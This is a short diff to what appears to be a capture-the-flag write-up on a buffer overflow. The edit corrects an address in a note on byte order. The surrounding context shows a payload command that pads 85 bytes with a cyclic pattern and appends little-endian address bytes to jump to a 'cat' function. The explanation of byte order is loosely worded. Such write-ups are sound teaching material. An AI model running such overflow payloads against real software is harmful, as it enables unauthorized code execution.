@@ -237,7 +237,7 @@ This section is the the juicy part.  It tells us the exact location address `0x0
 
 
 Using our BO offset of 85 bytes and the address of our cat function, putting it in Endian format, we construct the following payload2.
-a quick note on Endian format. Take the address `0x00400b0d` strip the last 3 hex numbers from it then place them in reverse order, inserting '\x' before each one:
+a quick note on Endian format. Take the address `0x00400b12` strip the last 3 hex numbers from it then place them in reverse order, inserting '\x' before each one:
 
 `echo -en "1\n$(cyclic 85)\x12\x0B\x40" > payload2 `
 
